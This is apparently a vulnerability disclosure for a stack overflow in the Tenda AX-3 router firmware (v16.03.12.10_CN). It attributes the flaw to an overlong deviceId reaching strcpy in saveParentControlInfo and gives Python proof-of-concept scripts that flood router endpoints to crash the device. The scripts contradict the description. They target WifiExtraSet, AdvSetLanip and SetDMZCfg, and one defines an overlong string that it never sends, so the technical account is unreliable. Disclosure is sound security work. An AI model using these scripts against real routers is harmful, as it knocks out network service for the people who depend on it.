# Tenda Vulnerability

Vendor:Tenda

Product:AX-3

Version:v16.03.12.10_CN(https://www.tenda.com.cn/material/show/3238)

Vulnerability Type: Stack Overflow

Author:Chuanhao Wan

Mail:chuanhaowan@hust.edu.cn

Institution:Huazhong University of Science and Technology(HUST)




## Vulnerability cause

In the saveParentControlInfo function, the deviceId parameter is obtained via websGetVar and propagated to the strcpy function. The strcpy function does not restrict the length of the deviceId parameter, and the target buffer size is 0x254u. By crafting a request with an excessively long deviceId parameter and a valid time parameter that passes the compare_parentcontrol_time check, a heap or stack overflow can be triggered, resulting in a Denial of Service (DoS) attack.

<div  align="center"><img src="./images/1.png" style="zoom:60%;" /></div>




## PoC
In order to reproduce the vulnerability, the following steps can be followed:

1.Boot the firmware by qemu-system or other ways (real machine)

2.Attack with the following POC attacks



```
import requests

url = "http://192.168.20.12/goform/WifiExtraSet"

serverName = "A" * 1000  
data = {
    "cloneType": "0",
}

r = requests.post(url, data=data)
print(r.status_code, r.text)
```

```
import requests

url = "http://192.168.20.12/goform/AdvSetLanip"

lanIp = "A" * 1000  
data = {
    "lanIp": "192.168.0." + lanIp
}

r = requests.post(url, data=data)
print(r.status_code, r.text)


url2 = "http://192.168.20.12/goform/SetDMZCfg"

data2 = {
    "dmzIp": "192.168.0.1" 
}

r2 = requests.post(url2, data=data2)
print(r2.status_code, r2.text)
```


## Result

The target router crashes and cannot provide services correctly and persistently.

<div  align="center"><img src="./images/2.png" style="zoom:80%;" /></div>
<div  align="center"><img src="./images/3.png" style="zoom:80%;" /></div>